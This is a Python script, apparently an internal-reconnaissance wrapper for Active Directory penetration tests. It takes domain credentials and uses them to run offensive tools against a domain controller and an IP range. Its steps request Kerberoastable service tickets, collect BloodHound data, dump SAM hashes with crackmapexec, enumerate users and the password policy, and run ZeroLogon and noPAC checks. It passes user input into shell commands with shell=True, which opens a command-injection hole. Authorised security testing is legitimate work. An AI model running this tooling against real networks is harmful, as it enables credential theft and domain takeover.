import argparse
import getpass
import subprocess
from termcolor import colored

# Function to write output to a text file
def write_to_file(content):
    with open('Internalrecon_output.txt', 'a') as f:
        f.write(content + '\n')

############## Kerberoasting ######################


def find_and_kerberoast_objects(username, password, domain, dc_ip):
    try:
        cmd = f"GetUserSPNs.py -dc-ip {dc_ip} {domain}/{username}:{password} -request"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        write_to_file(result.stdout)  # Save standard output
        write_to_file(result.stderr)  # Save error output if any
    except Exception as e:
        print(f"Error while searching for kerberoastable objects or Kerberoasting: {e}")


############## BloodHound Enumeration ######################


def bloodhound(username, password, domain, dc_ip):
    try:
        cmd = f"bloodhound-python -u {username} -p {password} -d {domain} -ns {dc_ip} -c All"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        write_to_file(result.stdout)
        write_to_file(result.stderr)
    except Exception as e:
        print(f"Error running BloodHound: {e}")


############## SMB Enumeration ######################


def crackmapexec(username, domain, password, scope):
    try:
        cmd = f"crackmapexec smb {scope} -u {username} -d {domain} -p {password} --sam"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        write_to_file(result.stdout)
        write_to_file(result.stderr)
    except Exception as e:
        print(f"Error running Crackmapexec: {e}")


############## Additional Reconnaissance ######################


def ldapSigning(username, password, domain, dc_ip):
    try:
        cmd = f"nxc ldap {dc_ip} -u '{username}' -p '{password}' -M ldap-checker"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        write_to_file(result.stdout)
        write_to_file(result.stderr)
    except Exception as e:
        print(f"Error while checking for LDAP Signing: {e}")


def enumUsers(username, password, domain, dc_ip):
    try:
        cmd = f"nxc smb {dc_ip} -u '{username}' -p '{password}' --users"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        write_to_file(result.stdout)
        write_to_file(result.stderr)
    except Exception as e:
        print(f"Error while enumerating users: {e}")


def enumPassPol(username, password, domain, dc_ip):
    try:
        cmd = f"nxc smb {dc_ip} -u '{username}' -p '{password}' --pass-pol"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        write_to_file(result.stdout)
        write_to_file(result.stderr)
    except Exception as e:
        print(f"Error while enumerating password policy: {e}")


def zerologon(username, password, domain, dc_ip):
    try:
        cmd = f"nxc smb {dc_ip} -u '{username}' -p '{password}' -M zerologon"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        write_to_file(result.stdout)
        write_to_file(result.stderr)
    except Exception as e:
        print(f"Error while checking for ZeroLogon: {e}")


def noPAC(username, password, domain, dc_ip):
    try:
        cmd = f"nxc smb {dc_ip} -u '{username}' -p '{password}' -M nopac"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        write_to_file(result.stdout)
        write_to_file(result.stderr)
    except Exception as e:
        print(f"Error while checking for noPAC: {e}")


############## Main Function for Combined Attacks ######################


def main(arguments=None):
    parser = argparse.ArgumentParser("AD_intrec_Combined")
    parser.add_argument("-u", "--username", help="Username for log in.")
    parser.add_argument("-p", "--password", help="Password for log in.")
    parser.add_argument("-d", "--domain", help="Domain of the DC.")
    parser.add_argument("-i", "--dc-ip", help="Domain Controller IP or hostname.")
    parser.add_argument("-s", "--scope", help="Newline delimited scope file.")
    parser.add_argument("-nc", "--no-crackmapexec", action="store_true", help="Do not run crackmapexec")
    parser.add_argument("-nu", "--no-enumUsers", action="store_true", help="Do not run enumUsers")
    parser.add_argument("-np", "--no-enumPassPol", action="store_true", help="Do not run enumPassPol")
    parser.add_argument("-nz", "--no-zerologon", action="store_true", help="Do not run zerologon")
    parser.add_argument("-npa", "--no-noPAC", action="store_true", help="Do not run noPAC")

    if arguments is None:
        args = parser.parse_args()
    else:
        args = parser.parse_args(arguments)

    if not args.username:
        args.username = input("Enter username: ")

    if not args.password:
        args.password = getpass.getpass("Enter password: ")

    if not args.domain:
        args.domain = input("Enter domain: ")

    if not args.dc_ip:
        args.dc_ip = input("Enter Domain Controller IP or hostname: ")

    if not args.scope:
        args.scope = input("Enter IP range to scan: ")

    print("*" * 40)
    print("Kerberoasting and BloodHound Enumeration")
    print("*" * 40)

    print("find_and_kerberoast_objects:")
    print("#" * 40)
    find_and_kerberoast_objects(args.username, args.password, args.domain, args.dc_ip)
    print("Done collecting kerberoast_objects information.")

    print("Bloodhound Findings")
    print("#" * 40)
    bloodhound(args.username, args.password, args.domain, args.dc_ip)
    print("Done collecting Bloodhound information.")

    print("*" * 40)
    print("SMB Enumeration and Additional Reconnaissance")
    print("*" * 40)

    if not args.no_crackmapexec:
        print("Crackmapexec Findings")
        print("#" * 40)
        crackmapexec(args.username, args.domain, args.password, args.scope)
        print("Done collecting crackmapexec information.")

    if not args.no_enumUsers:
        print("Users Information")
        print("#" * 40)
        enumUsers(args.username, args.password, args.domain, args.dc_ip)
        print("Done collecting enumUsers information.")

    if not args.no_enumPassPol:
        print("Password Information")
        print("#" * 40)
        enumPassPol(args.username, args.password, args.domain, args.dc_ip)
        print("Done collecting enumPassPol information.")

    if not args.no_zerologon:
        print("zerologon Vulnerability")
        print("#" * 40)
        zerologon(args.username, args.password, args.domain, args.dc_ip)
        print("Done collecting zerologon Vulnerability.")

    if not args.no_noPAC:
        print("noPAC Configuration")
        print("#" * 40)
        noPAC(args.username, args.password, args.domain, args.dc_ip)
        print("Done collecting noPAC Configuration.")


if __name__ == "__main__":
    main()
